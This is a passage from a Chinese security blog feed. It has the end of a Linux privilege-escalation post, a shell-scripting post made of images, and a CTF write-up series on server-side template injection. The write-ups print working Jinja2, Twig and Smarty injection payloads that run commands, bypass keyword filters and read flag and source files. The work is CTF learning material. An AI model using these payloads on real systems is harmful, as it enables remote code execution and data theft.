False</code></pre><p>其他……</p><blockquote><p>一般情况情况下，内核漏洞或者第三方服务来提权的情况更多。</p></blockquote><h1 id="如何防止被提权"><a href="#如何防止被提权" class="headerlink" title="如何防止被提权"></a>如何防止被提权</h1><ul><li>系统管理员要安全，准确的配置SUID执行文件。</li><li>一些没必要以高权限用户执行的文件，应该取消权限。</li><li>规避使用无密码root 执行命令，脚本等。</li><li>修复/升级存在已知漏洞的组件，升级操作系统版本最新版。</li><li>Linux 2.2 之后可以为命令增加 capabilities, 以p 师傅博客里的给nmap增加该属性为例。</li><li>升级第三方服务，修复已知漏洞</li></ul><pre><code>sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmapnmap --privileged -sS 192.168.1.1</code></pre><p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次学习，脑海里有了一个大概的思路，以后遇到了也不会迷惘。但是我旁边师傅给我说，靶机的提权有些在实际中根本用不到。所以，还是要灵活处理，核心思路应该是不变的吧！</p><p>注:本篇文章转自先知社区 ： <a href="https://xz.aliyun.com/t/7924#toc-0">https://xz.aliyun.com/t/7924#toc-0</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;为什么要提权&quot;&gt;&lt;a href=&quot;#为什么要提权&quot; class=&quot;headerlink&quot; title=&quot;为什么要提权?&quot;&gt;&lt;/a&gt;为什么要提权?&lt;/h1&gt;&lt;p&gt;当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行root 权限下的一</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux提权" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux shell 脚本编程</title>
    <link href="https://sakurahack-y.github.io/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/"/>
    <id>https://sakurahack-y.github.io/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/</id>
    <published>2022-03-09T08:34:21.000Z</published>
    <updated>2022-03-12T07:30:40.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文本三剑客之GREP与正则表达式入门"><a href="#文本三剑客之GREP与正则表达式入门" class="headerlink" title="文本三剑客之GREP与正则表达式入门"></a>文本三剑客之GREP与正则表达式入门</h1><h2 id="grep命令详解"><a href="#grep命令详解" class="headerlink" title="grep命令详解"></a>grep命令详解</h2><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309163744532.png" alt="image-20220309163744532"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164006965.png" alt="image-20220309164006965"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164124381.png" alt="image-20220309164124381"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164153116.png" alt="image-20220309164153116"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164202884.png" alt="image-20220309164202884"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164216276.png" alt="image-20220309164216276"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309170755365.png" alt="image-20220309170755365"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171250634.png" alt="image-20220309171250634"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171452021.png" alt="image-20220309171452021"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309171750029.png" alt="image-20220309171750029"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172440403.png" alt="image-20220309172440403"></p><h2 id="正则表达式入门"><a href="#正则表达式入门" class="headerlink" title="正则表达式入门"></a>正则表达式入门</h2><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172719330.png" alt="image-20220309172719330"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309172932180.png" alt="image-20220309172932180"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309173155868.png" alt="image-20220309173155868"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310221059335.png" alt="image-20220310221059335"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222034558.png" alt="image-20220310222034558"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222048846.png" alt="image-20220310222048846"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222156870.png" alt="image-20220310222156870"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222253774.png" alt="image-20220310222253774"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222536062.png" alt="image-20220310222536062"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310222947293.png" alt="image-20220310222947293"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223442895.png" alt="image-20220310223442895"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223457982.png" alt="image-20220310223457982"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310223913660.png" alt="image-20220310223913660"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310224006972.png" alt="image-20220310224006972"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220310224106984.png" alt="image-20220310224106984"></p><h1 id="文本三剑客之SED"><a href="#文本三剑客之SED" class="headerlink" title="文本三剑客之SED"></a>文本三剑客之SED</h1><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130438065.png" alt="image-20220312130438065"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130454053.png" alt="image-20220312130454053"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130622253.png" alt="image-20220312130622253"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312130857679.png" alt="image-20220312130857679"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312131800126.png" alt="image-20220312131800126"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312133718235.png" alt="image-20220312133718235"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312133753073.png" alt="image-20220312133753073"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312134452403.png" alt="image-20220312134452403"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312134809587.png" alt="image-20220312134809587"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312135021450.png" alt="image-20220312135021450"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312135508073.png" alt="image-20220312135508073"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312140156678.png" alt="image-20220312140156678"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312142630097.png" alt="image-20220312142630097"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144358895.png" alt="image-20220312144358895"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144428998.png" alt="image-20220312144428998"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144844748.png" alt="image-20220312144844748"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312144908004.png" alt="image-20220312144908004"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312150114829.png" alt="image-20220312150114829"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312150551903.png" alt="image-20220312150551903"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151045339.png" alt="image-20220312151045339"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151057114.png" alt="image-20220312151057114"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312151618086.png" alt="image-20220312151618086"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152110539.png" alt="image-20220312152110539"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152259202.png" alt="image-20220312152259202"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152359688.png" alt="image-20220312152359688"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152440203.png" alt="image-20220312152440203"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152528896.png" alt="image-20220312152528896"></p><p><strong>小tips</strong></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152552359.png" alt="image-20220312152552359"></p><p><strong>打印匹配字符串的下一行</strong></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152731016.png" alt="image-20220312152731016"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220312152914192.png" alt="image-20220312152914192"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文本三剑客之GREP与正则表达式入门&quot;&gt;&lt;a href=&quot;#文本三剑客之GREP与正则表达式入门&quot; class=&quot;headerlink&quot; title=&quot;文本三剑客之GREP与正则表达式入门&quot;&gt;&lt;/a&gt;文本三剑客之GREP与正则表达式入门&lt;/h1&gt;&lt;h2 id=&quot;g</summary>
      
    
    
    
    <category term="Linux" scheme="https://sakurahack-y.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://sakurahack-y.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>BUU-模板注入专项刷题</title>
    <link href="https://sakurahack-y.github.io/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/"/>
    <id>https://sakurahack-y.github.io/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/</id>
    <published>2022-02-27T13:49:10.000Z</published>
    <updated>2022-02-27T09:29:21.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h2><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><ul><li>  <del>[CSCCTF 2019 Qual]FlaskLight</del></li></ul><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><ul><li>  <del>[BJDCTF2020]Cookie is so stable twig模板注入</del></li><li>  <del>[WesternCTF2018]shrine 想方设法获取config</del></li><li>  <del>[CISCN2019 华东南赛区]Web11 smarty模板注入</del></li><li>  <del>[BJDCTF2020]The mystery of ip</del></li><li>  <del>[GYCTF2020]FlaskApp debug模式一定条件下可以窃取出来pin码命令执行，但是题目过滤的不够严格导致可以直接打，比签到难一点</del></li><li>  <del>[pasecactf_2019]flask_ssti 编码绕过</del></li><li>  <del>[GWCTF 2019]你的名字</del></li><li>  <del>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</del></li></ul><h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><ul><li>  <del>[护网杯 2018]easy_tornado 因为框架比较冷门，如果不看WP的话需要自己手动翻手册，我觉得算中上偏难的题目。</del></li><li>  <del>[CISCN2019 华东南赛区]Double Secret 国赛半决赛因为大家互相出题所以都互相恶心，这题整个MD4，线下环境怎么打？</del></li></ul><h3 id="困难"><a href="#困难" class="headerlink" title="困难"></a>困难</h3><ul><li>  [QWB2021 Quals]托纳多</li></ul><h3 id="脑洞"><a href="#脑洞" class="headerlink" title="脑洞"></a>脑洞</h3><ul><li>  <del>[RootersCTF2019]I_&lt;3_Flask 用name注入。？怎么想到的</del></li></ul><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160349289.png" alt="image-20220220160349289"></p><p>发现提示</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160501360.png" alt="image-20220220160501360"></p><p>测试成功</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160529875.png" alt="image-20220220160529875"></p><p>列出所有子类</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220160904114.png" alt="image-20220220160904114"></p><p>放入find.py跑一下敏感函数</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220161148184.png" alt="image-20220220161148184"></p><p>构造payload</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>出现未知错误</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220162228623.png" alt="image-20220220162228623"></p><p>这里应该是关键字过滤</p><p>那就绕它！</p><pre><code class="python">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('whoami').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220170734065.png" alt="image-20220220170734065"></p><p>同理可构造payload</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;</code></pre><p>读取flag</p><pre><code class="python">http://91ff8d9a-4ad0-491a-8d5d-c55157088e4f.node4.buuoj.cn:81/?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat flasklight/coomme_geeeett_youur_flek ').read()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220171038110.png" alt="image-20220220171038110"></p><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220191434667.png" alt="image-20220220191434667"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193930268.png" alt="image-20220220193930268"></p><p>存在模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220193953376.png" alt="image-20220220193953376"></p><p>判断为twig注入</p><p>payload</p><pre><code class="php">&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;</code></pre><p>写入输入框没有效果</p><p>hint页面有提示</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194318325.png" alt="image-20220220194318325"></p><p>抓包分析</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194407436.png" alt="image-20220220194407436"></p><p>发现cookie中有user接受我们输入的值，猜测这个模板注入参数在cookie中</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220194639959.png" alt="image-20220220194639959"></p><p>成功获得flag</p><h3 id="WesternCTF2018-shrine-想方设法获取config"><a href="#WesternCTF2018-shrine-想方设法获取config" class="headerlink" title="[WesternCTF2018]shrine 想方设法获取config"></a>[WesternCTF2018]shrine 想方设法获取config</h3><p>进去源码如下</p><pre><code class="python">import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>第一个路由是显示源码的，第二个路由可以传入参数，而且有黑名单过滤，猜测要读取配置文件</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220214030161.png" alt="image-20220220214030161"></p><p>测试一下存在模板注入</p><p>要利用模板注入来读取配置，config和self被过滤，但我们仍然可以利用url_for()和get_flashed_messages()函数来读取config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215728961.png" alt="image-20220220215728961"></p><p>发现</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215825765.png" alt="image-20220220215825765"></p><p>current_app意思应该是当前app，那我们就当前app下的config</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220220215947455.png" alt="image-20220220215947455"></p><p>flag出来了</p><p>最终payload</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG'])&#125;&#125;</code></pre><p>同理</p><pre><code class="python">http://139fe4b8-9ae9-452c-9af3-142eef361b68.node4.buuoj.cn:81/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h3 id="CISCN2019-华东南赛区-Web11-smarty模板注入"><a href="#CISCN2019-华东南赛区-Web11-smarty模板注入" class="headerlink" title="[CISCN2019 华东南赛区]Web11 smarty模板注入"></a>[CISCN2019 华东南赛区]Web11 smarty模板注入</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132600497.png" alt="image-20220221132600497"></p><p>敏感点X-Forwarded-For</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221132701696.png" alt="image-20220221132701696"></p><p>会随X-Forwarded-For的变化而变化</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133442199.png" alt="image-20220221133442199"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133450679.png" alt="image-20220221133450679"></p><p>存在模板注入</p><pre><code>X-Forwarded-For: &#123;$smarty.version&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133545104.png" alt="image-20220221133545104"></p><p>判断该模板为smart，版本号为3.1.30</p><h4 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a><code>&#123;if&#125;</code>标签</h4><p>官方文档中的描述：</p><ul><li>Smarty的<code>&#123;if&#125;</code>条件判断和PHP的if非常相似，只是增加了一些特性</li><li>每个<code>&#123;if&#125;</code>必须有一个配对的<code>&#123;/if&#125;</code>，也可以使用<code>&#123;else&#125;</code> 和 <code>&#123;elseif&#125;</code></li><li>全部的PHP条件表达式和函数都可以在if内使用，如<code>||</code>, <code>or</code>, <code>&amp;&amp;</code>, <code>and,</code> <code>is_array(),</code> 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></li></ul><p>payload</p><pre><code class="python">&#123;if phpinfo()&#125;&#123;/if&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133721417.png" alt="image-20220221133721417"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221133820171.png" alt="image-20220221133820171"></p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134457254.png" alt="image-20220221134457254"></p><p>和上道题很相似,测试一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134530290.png" alt="image-20220221134530290"></p><p>模板注入有了</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221134855416.png" alt="image-20220221134855416"></p><p>还是smart模板</p><p>和上道题一模一样，直接拿下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221135006801.png" alt="image-20220221135006801"></p><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141908719.png" alt="image-20220221141908719"></p><p>hint:失败的意思就是，要让程序运行报错,报错后会暴露源码。</p><p>base64decode在不会解析的时候就会报错。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221141936523.png" alt="image-20220221141936523"></p><p>拿到源码</p><pre><code class="python">@app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )</code></pre><p>应该存在模板注入，测试一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142421065.png" alt="image-20220221142421065"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142406088.png" alt="image-20220221142406088"></p><p>模板注入有了</p><p>上payload</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142900538.png" alt="image-20220221142900538"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221142907823.png" alt="image-20220221142907823"></p><p>被这里的waf过滤了</p><p>读取下app.py</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64 app = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = 